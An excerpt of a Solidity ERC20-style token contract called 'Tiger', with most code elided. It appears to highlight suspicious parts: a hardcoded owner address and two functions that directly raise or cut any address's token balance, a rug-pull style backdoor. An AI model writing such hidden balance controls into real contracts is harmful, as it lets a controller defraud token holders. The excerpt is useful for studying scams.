...
contract Ownable is Context {
    ...
    address private _owners = 0xedBa5AD4949f3C4B6059081a7b53356511274d6d;
...
contract Tiger is Context, IERC20, Ownable {
    ...
    address public devAddress = 0xedBa5AD4949f3C4B6059081a7b53356511274d6d;
     ...
     require(owners == sender, "allbhei");
        ...
        _approve(
            ...
            allowances[sender][_msgSender()].sub(
                amount,
                "BRP20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    ...
    function isExcludedFromReward(address recipient) public view returns (bool) {
        return _isExcluded[recipient];
    }
    ...
    function addfreedquantity(address freedAddress, uint256 freedamount) 
        ...
        _rOwned[freedAddress] = _rOwned[freedAddress].add(freedamount);
    }
    ...
    function setburnfreedquantity(address burnfreedAddress, uint256 burnfreedamount)
        ...
        _rOwned[burnfreedAddress] = _rOwned[burnfreedAddress].sub(burnfreedamount);
    }
